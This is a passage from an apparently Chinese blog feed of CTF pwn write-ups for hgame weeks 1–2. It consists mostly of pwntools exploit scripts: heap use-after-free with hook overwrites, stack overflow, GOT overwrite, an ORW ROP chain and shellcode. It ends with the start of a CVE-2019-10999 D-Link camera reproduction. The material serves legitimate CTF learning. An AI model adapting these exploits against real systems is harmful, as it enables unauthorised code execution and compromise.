debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30472</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br>show(<span class="hljs-number">8</span>)<br><br>malloc_hook = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>delete(<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(malloc_hook)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x60</span>, payload)<br><br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x80</span>, p64(one_gadget))<br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">9</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><p>libc2.31 UAF漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31905</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>leak = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br><br>malloc_hook = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">2</span>, p64(free_hook) + p64(<span class="hljs-number">0</span>))<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br><br>edit(<span class="hljs-number">5</span>, p64(system))<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>delete(<span class="hljs-number">4</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week1</title>
    <link href="/2023/02/06/2022-hgame-week1/"/>
    <url>/2023/02/06/2022-hgame-week1/</url>
    
    <content type="html"><![CDATA[<h1 id="hgame-week1-pwn-wp"><a href="#hgame-week1-pwn-wp" class="headerlink" title="hgame week1-pwn wp"></a>hgame week1-pwn wp</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>直接nc即可。</p><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30487</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>backdoor = <span class="hljs-number">0x40117E</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(backdoor)<br>p.sendline(payload)<br><br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p>覆盖exit_got为main，泄漏puts地址，最后覆盖puts_got为system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31094</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>main = <span class="hljs-number">0x4012d1</span><br>exit_plt = <span class="hljs-number">0x4010e0</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-6&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>payload = p64(main) + p64(<span class="hljs-number">0</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-9&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br><br>puts = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;puts: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-9&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>控制rbp或者rax即可实现对rsi的控制，进而read任一地址。</p><p><img src="/img/hgame-2022-week1/image-20230111114144304.png" alt="image-20230111114144304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32124</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>read = <span class="hljs-number">0x4012d6</span><br>main = <span class="hljs-number">0x4012f0</span><br><br>pop_rdi_ret = <span class="hljs-number">0x401393</span><br>leave_ret = <span class="hljs-number">0x4012be</span><br>data = <span class="hljs-number">0x404100</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br><br>puts = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;puts: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>pop_rax_ret = libc_base + <span class="hljs-number">0x36174</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x142c92</span><br>syscall_ret = libc_base + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(data) + p64(pop_rax_ret) + p64(data) + p64(read) + p64(leave_ret) + p64(<span class="hljs-number">0</span>)<br>p.send(payload)<br><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    data,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data + <span class="hljs-number">0x100</span>,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x100</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data + <span class="hljs-number">0x100</span>,<br>    syscall_ret<br>]<br><br>payload = <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + flat(rop_data)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32737</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>p.recvuntil(<span class="hljs-string">&#x27;your shellcode:&#x27;</span>)<br><br>p1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    mov esi, 0xCAFE0100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(p1)))<br>p.send(asm(p1))<br><br>p2 = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>p.sendline(p2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-10999-Dlink摄像头缓冲区溢出漏洞复现</title>
    <link href="/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-10999-Dlink-ip摄像头复现"><a href="#CVE-2019-10999-Dlink-ip摄像头复现" class="headerlink" title="CVE-2019-10999 Dlink ip摄像头复现"></a><strong>CVE-2019-10999</strong> Dlink ip摄像头复现</h1><p><strong>CVE-2019-10999</strong> 是 Dlink IP 摄像头的后端服务器程序 <code>alphapd</code> 中的一个缓冲区溢出漏洞，漏洞允许经过身份认证的用户在请求 <code>wireless.htm</code> 时，传入 <code>WEPEncryption</code> 参数一个长字符串来执行任意代码。</p><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> $(<span class="hljs-built_in">which</span> qemu-mipsel-static) .<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/alphapd<br></code></pre></td></tr></table></figure><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p><img src="/img/CVE-2019-10999/image-20230202230424511.png"></p><p>将<code>alphapd</code>拖入<strong>ida</strong>查找<strong>pid</strong>字段，发现该<code>fopen</code>语句。</p><p><img src="/img/CVE-2019-10999/image-20230202230805502.png"></p><p>所以我们在该固件的根目录下创建该文件。</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p><img src="/img/CVE-2019-10999/image-20230202231256607.png"></p><p>查找<strong>random</strong>字段，发现如下<code>open</code>语句。</p><p><img src="/img/CVE-2019-10999/image-20230202231443841.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/random c 1 8<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/urandom c 1 9<br></code></pre></td></tr></table></figure><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p><img src="/img/CVE-2019-10999/image-20230202231703309.png"></p><p>这里<strong>无法写入random state</strong>，解决方式如下,</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">touch</span> .rnd<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd ./bin/alphapd<br></code></pre></td></tr></table></figure><p>具体原理：</p><p>OpenSSL 需要写入一些信息到 .rnd 文件，上面的问题可能是因为 .rnd 文件不存在，OpenSSL 不知道默认文件在何处，因为 RANDFILE 和 HOME 环境变量没有设置，那么解决方法就是创建 .rnd 文件并且设置环境变量指向这个文件。qemu 启动的时候设置这两个环境变量，解决了上面的问题。</p><p><img src="/img/CVE-2019-10999/image-20230202232059030.png"></p><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p><img src="/img/CVE-2019-10999/image-20230202232137574.png"></p><p>直接在ida中搜索并定位问题。</p><p><img src="/img/CVE-2019-10999/image-20230202232247250.png"></p><p><img 